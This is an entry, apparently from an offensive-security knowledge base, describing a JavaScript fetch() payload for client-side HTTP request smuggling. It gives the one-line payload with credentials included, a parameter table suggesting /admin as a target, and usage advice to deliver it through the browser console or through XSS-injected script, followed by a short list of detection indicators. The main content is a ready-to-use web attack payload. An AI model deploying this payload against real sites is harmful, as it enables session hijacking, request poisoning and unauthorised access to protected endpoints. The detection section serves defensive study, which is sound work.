---
id: 97fa8e15-c053-4ddf-a418-356573d87ede
name: JavaScript-Fetch-for-HTTP-Request-Smuggling
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:32.066153+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
tags:
  - http-smuggling
  - client-side
  - fetch-api
validated: true
---

# JavaScript-Fetch-for-HTTP-Request-Smuggling

## Code

```javascript
fetch('https://www.example.com/', {method: 'POST', body: "GET / HTTP/1.1\r\nHost: www.example.com", mode: 'no-cors', credentials: 'include'} )
```

## Description

This JavaScript code uses the Fetch API to send a POST request with a smuggled GET request embedded in the body, exploiting HTTP Request Smuggling vulnerabilities in browser contexts. It operates under no-cors mode to simulate cross-origin attacks and includes credentials for session-based smuggling, useful for client-side desync testing.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 'https://www.example.com/' | Target URL for the request | 'https://target.com/' |
| body: "GET / HTTP/1.1\r\nHost: www.example.com" | Smuggled GET request as POST body | "GET /admin HTTP/1.1\r\nHost: target.com" |
| mode: 'no-cors' | Allows opaque responses for smuggling simulation | Built-in |
| credentials: 'include' | Sends cookies/sessions with request | Built-in |

## Usage

Execute this in a browser console on a page sharing the origin with the target or via a script injected through XSS. Use after initial server-side smuggling to verify poisoning from the client side. For example, replace the URL and body to target specific endpoints like /admin for privilege escalation testing.

## Detection

- Browser developer tools showing anomalous Fetch requests with embedded HTTP methods in bodies.
- Server logs indicating mismatched request methods (POST parsing as GET).
- WAF alerts on chunked or TE header anomalies in client-initiated requests.
- Network monitoring for no-cors mode traffic with credential inclusion to unusual paths.

## Related

- [[procedures/HTTP-Request-Smuggling-via-TE-and-Response-Queue-Poisoning]]
